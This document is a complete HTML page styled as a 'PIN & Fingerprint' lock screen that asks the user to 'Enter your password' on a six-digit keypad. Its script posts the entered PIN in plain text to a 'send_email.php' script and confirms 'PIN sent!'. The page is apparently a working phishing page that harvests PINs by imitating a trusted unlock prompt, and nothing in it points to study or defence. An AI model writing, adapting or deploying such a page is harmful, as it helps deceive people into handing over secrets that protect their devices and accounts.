<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>PIN & Fingerprint</title>
  <style>
    body {
      background-color: #1e1e2f;
      color: white;
      text-align: center;
      font-family: sans-serif;
    }
    .pin-container {
      margin-top: 50px;
    }
    .circle {
      display: inline-block;
      width: 10px;
      height: 10px;
      margin: 5px;
      border-radius: 50%;
      background-color: gray;
    }
    .circle.filled {
      background-color: dodgerblue;
    }
    .keypad {
      display: grid;
      grid-template-columns: repeat(3, 60px);
      gap: 10px;
      justify-content: center;
      margin: 20px auto;
    }
    button {
      font-size: 20px;
      padding: 15px;
      border-radius: 50%;
      border: none;
      background-color: #333;
      color: white;
    }
  </style>
</head>
<body>
  <h2>PIN & Fingerprint</h2>
  <p>Enter your password</p>
  <div class="pin-container" id="pinContainer">
    <!-- 6 Dots -->
    <div class="circle" id="dot1"></div>
    <div class="circle" id="dot2"></div>
    <div class="circle" id="dot3"></div>
    <div class="circle" id="dot4"></div>
    <div class="circle" id="dot5"></div>
    <div class="circle" id="dot6"></div>
  </div>

  <div class="keypad">
    <!-- 1 to 9 -->
    <button onclick="addDigit(1)">1</button>
    <button onclick="addDigit(2)">2</button>
    <button onclick="addDigit(3)">3</button>
    <button onclick="addDigit(4)">4</button>
    <button onclick="addDigit(5)">5</button>
    <button onclick="addDigit(6)">6</button>
    <button onclick="addDigit(7)">7</button>
    <button onclick="addDigit(8)">8</button>
    <button onclick="addDigit(9)">9</button>
    <button onclick="clearPIN()">X</button>
    <button onclick="addDigit(0)">0</button>
    <button onclick="submitPIN()">OK</button>
  </div>

  <script>
    let pin = "";

    function updateDots() {
      for (let i = 1; i <= 6; i++) {
        document.getElementById(`dot${i}`).classList.toggle('filled', i <= pin.length);
      }
    }

    function addDigit(num) {
      if (pin.length < 6) {
        pin += num;
        updateDots();
      }
    }

    function clearPIN() {
      pin = "";
      updateDots();
    }

    function submitPIN() {
      if (pin.length === 6) {
        fetch('send_email.php', {
          method: 'POST',
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: `pin=${pin}`
        }).then(() => {
          alert("PIN sent!");
          clearPIN();
        });
      } else {
        alert("Enter 6-digit PIN");
      }
    }
  </script>
</body>
</html>
